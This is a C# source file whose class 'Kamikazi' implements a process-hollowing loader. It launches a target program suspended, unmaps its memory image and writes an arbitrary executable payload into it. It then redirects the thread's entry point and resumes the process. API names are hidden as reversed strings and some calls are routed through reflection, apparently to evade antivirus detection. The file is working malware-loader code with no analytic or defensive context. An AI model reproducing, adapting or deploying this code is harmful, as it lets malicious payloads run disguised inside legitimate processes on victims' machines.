using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic;

namespace GIT
{
    public class Kamikazi
    {
        public static Int16 ToInt16(byte[] value, int startIndex)
        {
            return (Int16)typeof(BitConverter).GetMethod("ToIn" + "t16").Invoke(null, new object[] { value, startIndex });
        }
        public static Int32 ToInt32(byte[] value, int startIndex)
        {
            return (Int32)typeof(BitConverter).GetMethod("To" + "Int32").Invoke(null, new object[] { value, startIndex });
        }
        public static byte[] GetBytes(int value)
        {
            System.Reflection.MethodInfo[] mi = typeof(BitConverter).GetMethods();
            byte[] Result = new byte[] { };
            for (int i = 0; i < mi.Length; i++)
            {
                if (mi[i].Name == "Get" + "Bytes")
                {
                    if (mi[i].GetParameters()[0].ParameterType.Name == "In" + "t32")
                    {
                        Result = (byte[])mi[i].Invoke(null, new object[] { value });
                    }
                }
            }
            return Result;
        }

        public static string[] ReturnParams()
        {
            string KJ = "23lenrek[||]lldtn[||]daerhTemuseR[||]txetnoCdaerhTteS46woW[||]txetnoCdaerhTteS[||]txetnoCdaerhTteG46woW[||]txetnoCdaerhTteG[||]xEcollAlautriV[||]yromeMssecorPetirW[||]yromeMssecorPdaeR[||]noitceSfOweiVpamnUwZ[||]AssecorPetaerC";
            return KJ.Split(new string[] { "[||]" }, StringSplitOptions.None);
        }
        #region API delegate
        private delegate int ResumeThread_Delegate(IntPtr handle);
        private delegate bool Wow64SetThreadContext_Delegate(IntPtr thread, int[] context);
        private delegate bool SetThreadContext_Delegate(IntPtr thread, int[] context);
        private delegate bool Wow64GetThreadContext_Delegate(IntPtr thread, int[] context);
        private delegate bool GetThreadContext_Delegate(IntPtr thread, int[] context);
        private delegate int VirtualAllocEx_Delegate(IntPtr handle, int address, int length, int type, int protect);
        private delegate bool WriteProcessMemory_Delegate(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);
        private delegate bool ReadProcessMemory_Delegate(IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref int bytesRead);
        private delegate int ZwUnmapViewOfSection_Delegate(IntPtr process, int baseAddress);
        private delegate bool CreateProcessA_Delegate(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes,
            bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref StartupInformation startupInfo, ref ProcessInformation processInformation);
        #endregion

        #region API
        private static readonly ResumeThread_Delegate ResumeThread = LoadApi<ResumeThread_Delegate>(Strings.StrReverse(ReturnParams()[0]), Strings.StrReverse(ReturnParams()[2]));
        private static readonly Wow64SetThreadContext_Delegate Wow64SetThreadContext = LoadApi<Wow64SetThreadContext_Delegate>(Strings.StrReverse(ReturnParams()[0]), Strings.StrReverse(ReturnParams()[3]));
        private static readonly SetThreadContext_Delegate SetThreadContext = LoadApi<SetThreadContext_Delegate>(Strings.StrReverse(ReturnParams()[0]), Strings.StrReverse(ReturnParams()[4]));
        private static readonly Wow64GetThreadContext_Delegate Wow64GetThreadContext = LoadApi<Wow64GetThreadContext_Delegate>(Strings.StrReverse(ReturnParams()[0]), Strings.StrReverse(ReturnParams()[5]));
        private static readonly GetThreadContext_Delegate GetThreadContext = LoadApi<GetThreadContext_Delegate>(Strings.StrReverse(ReturnParams()[0]), Strings.StrReverse(ReturnParams()[6]));
        private static readonly VirtualAllocEx_Delegate VirtualAllocEx = LoadApi<VirtualAllocEx_Delegate>(Strings.StrReverse(ReturnParams()[0]), Strings.StrReverse(ReturnParams()[7]));
        private static readonly WriteProcessMemory_Delegate WriteProcessMemory = LoadApi<WriteProcessMemory_Delegate>(Strings.StrReverse(ReturnParams()[0]), Strings.StrReverse(ReturnParams()[8]));
        private static readonly ReadProcessMemory_Delegate ReadProcessMemory = LoadApi<ReadProcessMemory_Delegate>(Strings.StrReverse(ReturnParams()[0]), Strings.StrReverse(ReturnParams()[9]));
        private static readonly ZwUnmapViewOfSection_Delegate ZwUnmapViewOfSection = LoadApi<ZwUnmapViewOfSection_Delegate>(Strings.StrReverse(ReturnParams()[1]), Strings.StrReverse(ReturnParams()[10]));
        private static readonly CreateProcessA_Delegate CreateProcessA = LoadApi<CreateProcessA_Delegate>(Strings.StrReverse(ReturnParams()[0]), Strings.StrReverse(ReturnParams()[11]));
        #endregion


        #region CreateAPI
        [DllImport("kernel32", SetLastError = true)]
        private static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);
        [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        private static extern IntPtr GetProcAddress(IntPtr hProcess, [MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);
        private static CreateApi LoadApi<CreateApi>(string name, string method)
        {
            return (CreateApi)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(ref name), ref method), typeof(CreateApi));
        }
        #endregion


        #region Structure
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        private struct ProcessInformation
        {
            public readonly IntPtr ProcessHandle;
            public readonly IntPtr ThreadHandle;
            public readonly uint ProcessId;
            private readonly uint ThreadId;
        }
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        private struct StartupInformation
        {
            public uint Size;
            private readonly string Reserved1;
            private readonly string Desktop;
            private readonly string Title;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 36)] private readonly byte[] Misc;
            private readonly IntPtr Reserved2;
            private readonly IntPtr StdInput;
            private readonly IntPtr StdOutput;
            private readonly IntPtr StdError;
        }
        #endregion

        public static void Execute(string path, byte[] payload)
        {
            for (int i = 0; i < 5; i++)
            {
                int readWrite = 0;
                StartupInformation SI = new StartupInformation();
                ProcessInformation PI = new ProcessInformation();
                SI.Size = Convert.ToUInt32(Marshal.SizeOf(typeof(StartupInformation)));
                try
                {
                    bool CPA = CreateProcessA(path, "", IntPtr.Zero, IntPtr.Zero, false, 4 | 134217728, IntPtr.Zero, null, ref SI, ref PI);
                    if (!CPA)
                    {
                        throw new Exception();
                    }
                    int fileAddress = ToInt32(payload, 30 + 30);
                    int imageBase = ToInt32(payload, fileAddress + 50 + 2);
                    int[] context = new int[170 + 9];
                    context[0] = 65538;
                    if (IntPtr.Size == 4)
                    { if (!GetThreadContext(PI.ThreadHandle, context)) throw new Exception(); }
                    else
                    { if (!Wow64GetThreadContext(PI.ThreadHandle, context)) throw new Exception(); }
                    int ebx = context[41];
                    int baseAddress = 0;
                    if (!ReadProcessMemory(PI.ProcessHandle, ebx + 8, ref baseAddress, 4, ref readWrite)) throw new Exception();
                    if (imageBase == baseAddress)
                        if (ZwUnmapViewOfSection(PI.ProcessHandle, baseAddress) != 0) throw new Exception();
                    int sizeOfImage = ToInt32(payload, fileAddress + 80);
                    int sizeOfHeaders = ToInt32(payload, fileAddress + 84);
                    bool allowOverride = false;
                    int newImageBase = VirtualAllocEx(PI.ProcessHandle, imageBase, sizeOfImage, 12288, 64);

                    if (newImageBase == 0) throw new Exception();
                    if (!WriteProcessMemory(PI.ProcessHandle, newImageBase, payload, sizeOfHeaders, ref readWrite)) throw new Exception();
                    int sectionOffset = fileAddress + 248;
                    short numberOfSections = ToInt16(payload, fileAddress + 6);
                    for (int I = 0; I < numberOfSections; I++)
                    {
                        int virtualAddress = (int)typeof(Kamikazi).GetMethod("ToInt32").Invoke(null, new object[] { payload, sectionOffset + 12 });
                        int sizeOfRawData = (int)typeof(Kamikazi).GetMethod("ToInt32").Invoke(null, new object[] { payload, sectionOffset + 16 });
                        int pointerToRawData = (int)typeof(Kamikazi).GetMethod("ToInt32").Invoke(null, new object[] { payload, sectionOffset + 20 });
                        if (sizeOfRawData != 0)
                        {
                            byte[] sectionData = new byte[sizeOfRawData];
                            typeof(Buffer).GetMethod("BlockCopy").Invoke(null, new object[] { payload, pointerToRawData, sectionData, 0, sectionData.Length });
                            if (!WriteProcessMemory(PI.ProcessHandle, newImageBase + virtualAddress, sectionData, sectionData.Length, ref readWrite)) throw new Exception();
                        }
                        sectionOffset += 40;
                    }
                    byte[] pointerData = GetBytes(newImageBase);
                    if (!WriteProcessMemory(PI.ProcessHandle, ebx + 8, pointerData, 4, ref readWrite)) throw new Exception();
                    int addressOfEntryPoint = ToInt32(payload, fileAddress + 40);
                    if (allowOverride) newImageBase = imageBase;
                    context[44] = newImageBase + addressOfEntryPoint;

                    if (IntPtr.Size == 4)
                    {
                        if (!SetThreadContext(PI.ThreadHandle, context)) throw new Exception();
                    }
                    else
                    {
                        if (!Wow64SetThreadContext(PI.ThreadHandle, context)) throw new Exception();
                    }
                    if (ResumeThread(PI.ThreadHandle) == -1) throw new Exception();
                }
                catch
                {
                    Process.GetProcessById(Convert.ToInt32(PI.ProcessId)).Kill();
                    continue;
                }
                break;
            }
        }
    }
}